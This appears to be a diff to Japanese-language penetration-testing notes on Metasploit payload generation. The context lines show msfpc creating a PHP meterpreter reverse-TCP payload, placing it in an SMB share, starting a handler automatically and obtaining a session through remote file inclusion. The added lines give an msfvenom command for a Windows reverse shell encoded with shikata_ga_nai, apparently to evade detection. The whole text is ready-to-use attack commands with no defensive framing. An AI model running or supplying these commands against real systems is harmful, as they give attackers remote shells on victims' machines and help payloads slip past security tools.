@@ -21,3 +21,8 @@ metasploitで動かすペイロードとコマンドセットを自動で作成�
 msfpc php <kali IP>　＃これで作成されるphpをsmbディレクトリに置く
 msfconsole -q -r '/home/kali/Desktop/php-meterpreter-staged-reverse-tcp-443-php.rc'　＃runで表示されるこのコマンドを実行するとハンドラーで待ち受けまで自動でする
 RFIなどでphpを読み込ませたらmeterpreterでセッションが確立
+
+//エンコーディング
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai　#shikata_ga_naiエンコード
+
+
